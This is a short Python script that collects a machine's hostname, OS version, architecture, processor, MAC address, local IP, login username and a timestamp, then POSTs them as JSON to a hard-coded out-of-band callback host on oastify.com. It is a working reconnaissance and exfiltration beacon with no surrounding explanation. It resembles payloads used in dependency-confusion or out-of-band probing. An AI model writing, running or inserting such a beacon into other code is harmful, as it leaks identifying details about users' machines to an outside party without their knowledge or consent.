import platform
import socket
import os
import json
import uuid
import time
import urllib.request

def get_system_info():
    system_info = {
        "hostname": socket.gethostname(),
        "platform": platform.system(),
        "platform_release": platform.release(),
        "platform_version": platform.version(),
        "architecture": platform.machine(),
        "processor": platform.processor(),
        "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                               for elements in range(0,8*6,8)][::-1]),
        "ip_address": socket.gethostbyname(socket.gethostname()),
        "username": os.getlogin() if hasattr(os, 'getlogin') else 'Unknown',
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    }
    
    return system_info

def send_info(url, data):
    try:
        # Convert data to JSON
        json_data = json.dumps(data).encode('utf-8')
        
        # Create request with JSON data
        req = urllib.request.Request(url)
        req.add_header('Content-Type', 'application/json; charset=utf-8')
        req.add_header('Content-Length', len(json_data))
        
        # Send request
        response = urllib.request.urlopen(req, json_data)
        return f"Data sent successfully. Response code: {response.getcode()}"
    except Exception as e:
        return f"Error sending data: {str(e)}"

if __name__ == "__main__":
    # Collect system information
    system_info = get_system_info()
    
    # The URL to send the data to
    url = "http://9pzlresig662zrsfyl3zvnz77ydp1npc.oastify.com"
    
    # Send the information
    result = send_info(url, system_info)
    print(result)
